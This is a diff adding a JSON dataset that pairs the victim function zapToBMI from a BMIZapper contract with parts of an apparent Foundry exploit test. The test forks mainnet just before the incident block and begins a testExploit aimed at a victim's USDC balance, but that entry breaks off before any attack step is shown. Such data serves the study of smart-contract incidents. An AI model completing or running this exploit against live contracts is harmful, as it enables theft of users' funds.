@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "IBMIZapper",
+    "source_type": "victim_contract",
+    "function_name": "zapToBMI",
+    "original_code": "    function zapToBMI(\n        address _from,\n        uint256 _amount,\n        address _fromUnderlying,\n        uint256 _fromUnderlyingAmount,\n        uint256 _minBMIRecv,\n        address[] memory _bmiConstituents,\n        uint256[] memory _bmiConstituentsWeightings,\n        address _aggregator,\n        bytes memory _aggregatorData,\n        bool refundDust\n    ) public returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i < _bmiConstituentsWeightings.length; i++) {\n            sum = sum.add(_bmiConstituentsWeightings[i]);\n        }\n\n        // Sum should be between 0.999 and 1.000\n        assert(sum <= 1e18);\n        assert(sum >= 999e15);\n\n        // Transfer to contract\n        IERC20(_from).safeTransferFrom(msg.sender, address(this), _amount);\n\n        // Primitive\n        if (_isBare(_from)) {\n            _primitiveToBMI(_from, _amount, _bmiConstituents, _bmiConstituentsWeightings, _aggregator, _aggregatorData);\n        }\n        // Yearn (primitive)\n        else if (_isYearn(_from)) {\n            IYearn(_from).withdraw();\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Yearn (primitive)\n        else if (_isYearnCRV(_from)) {\n            IYearn(_from).withdraw();\n            address crvToken = IYearn(_from).token();\n            _crvToPrimitive(crvToken, IERC20(crvToken).balanceOf(address(this)));\n            _primitiveToBMI(\n                USDC,\n                IERC20(USDC).balanceOf(address(this)),\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                address(0),\n                \"\"\n            );\n        }\n        // Compound\n        else if (_isCompound(_from)) {\n            require(ICToken(_from).redeem(_amount) == 0, \"!ctoken-redeem\");\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Aave\n        else if (_isAave(_from)) {\n            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, 0);\n            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, _amount);\n            ILendingPoolV2(AAVE_LENDING_POOL_V2).withdraw(_fromUnderlying, type(uint256).max, address(this));\n\n            _primitiveToBMI(\n                _fromUnderlying,\n                _fromUnderlyingAmount,\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                _aggregator,\n                _aggregatorData\n            );\n        }\n        // Curve\n        else {\n            _crvToPrimitive(_from, _amount);\n            _primitiveToBMI(\n                USDC,\n                IERC20(USDC).balanceOf(address(this)),\n                _bmiConstituents,\n                _bmiConstituentsWeightings,\n                address(0),\n                \"\"\n            );\n        }\n\n        // Checks\n        uint256 _bmiBal = IERC20(BMI).balanceOf(address(this));\n        require(_bmiBal >= _minBMIRecv, \"!min-mint\");\n        IERC20(BMI).safeTransfer(msg.sender, _bmiBal);\n\n        // Convert back dust to USDC and refund remaining USDC to usd\n        if (refundDust) {\n            for (uint256 i = 0; i < _bmiConstituents.length; i++) {\n                _fromBMIConstituentToUSDC(_bmiConstituents[i], IERC20(_bmiConstituents[i]).balanceOf(address(this)));\n            }\n            IERC20(USDC).safeTransfer(msg.sender, IERC20(USDC).balanceOf(address(this)));\n        }\n\n        return _bmiBal;\n    }\n\n    // **** Internal helpers ****\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 19_029_290 - 1);\n        cheats.label(address(bmiZapper), \"BMIZapper\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ExploitTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"Victim's USDC balance before exploit\", USDC.balanceOf(victim), USDC.decimals());\n\n        uint256 victimBalance = USDC.balanceOf(victim);\n\n        address[] memory bmiConstituents = new address[](0); // Empty bmiConstituents array\n        uint256[] memory bmiConstituentsWeightings = new uint256[](1);\n        bmiConstituentsWeightings[0] = 1e18; // 100% weighting for demonstration\n\n",
+    "description": ""
+  }
+]
